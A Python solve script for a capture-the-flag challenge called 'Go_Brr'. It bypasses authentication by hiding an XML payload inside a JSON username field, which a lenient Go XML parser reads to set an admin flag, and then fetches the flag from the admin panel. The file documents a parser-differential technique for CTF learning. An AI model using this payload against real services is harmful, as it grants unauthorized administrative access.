#!/usr/bin/env python3

"""
Challenge Name: Go_Brr
Key insight: Go's XML parser is lenient and can parse embedded XML within JSON.
The xml:"-,omitempty" tag binds to element name "-" instead of ignoring the field.

The vulnerability:
1. Flask sends JSON to Go service
2. Go tries XML parsing first on the JSON body
3. XML parser tolerates garbage and extracts embedded XML
4. <A:->true</A:-> sets IsAdmin via the "-" element name
5. Returns "Authorized" and Flask sets admin session
"""

import requests
import json

print("=== THE ACTUAL WORKING SOLUTION ===")

flask_url = 'http://URL/user'

# The payload that embeds XML within JSON
# The XML parser will ignore the JSON garbage and extract the XML
payload = {
    "username": "<User><A:->true</A:-></User>",
    "password": "anything"
}

print(f"Sending payload: {payload}")
print("This creates JSON body that contains embedded XML")
print("Go's XML parser will extract: <User><A:->true</A:-></User>")
print("The <A:->true</A:-> sets IsAdmin to true via the '-' element name")

try:
    session = requests.Session()
    
    # Send the crafted payload
    response = session.post(flask_url, json=payload)
    
    print(f"\nAuth Response: {response.text}")
    print(f"Auth Status: {response.status_code}")
    
    if response.status_code == 200 and "Authorized" in response.text:
        print("🎉 AUTHENTICATION BYPASS SUCCESSFUL!")
        print("The XML parser extracted embedded XML and set IsAdmin=true")
        
        # Now access the admin panel to get the flag
        admin_response = session.get('http://URL/admin')
        print(f"\nAdmin Panel Response: {admin_response.text}")
        print(f"Admin Status: {admin_response.status_code}")
        
        if "flag" in admin_response.text.lower() or "BHFlagY" in admin_response.text:
            print("🏆 FLAG OBTAINED!")
            
            # Extract the flag
            if "BHFlagY" in admin_response.text:
                flag_start = admin_response.text.find("BHFlagY")
                flag_end = admin_response.text.find("}", flag_start) + 1
                flag = admin_response.text[flag_start:flag_end]
                print(f"\n🚩 FLAG: {flag}")
            else:
                print(f"Flag content: {admin_response.text}")
        else:
            print("Admin access granted but no flag found in response")
    else:
        print("❌ Authentication bypass failed")
        print("The XML parsing technique didn't work as expected")
        
except Exception as e:
    print(f"Error: {e}")

print("\n" + "="*60)
print("EXPLANATION OF THE VULNERABILITY:")
print("="*60)
print("1. Flask sends JSON body to Go service via requests.post()")
print("2. Go tries XML unmarshaling first: xml.Unmarshal(body, &user)")
print("3. Go's XML parser is LENIENT - tolerates garbage around valid XML")
print("4. JSON body: {\"username\":\"<User><A:->true</A:-></User>\",\"password\":\"anything\"}")
print("5. XML parser ignores JSON garbage, extracts: <User><A:->true</A:-></User>")
print("6. xml:\"-,omitempty\" tag binds to element name \"-\"")
print("7. <A:->true</A:-> uses namespace prefix to make \"-\" a valid local name")
print("8. IsAdmin gets set to true, Go returns \"Authorized\"")
print("9. Flask sets session['is_admin'] = True")
print("10. Admin panel access granted with flag!")
print("="*60)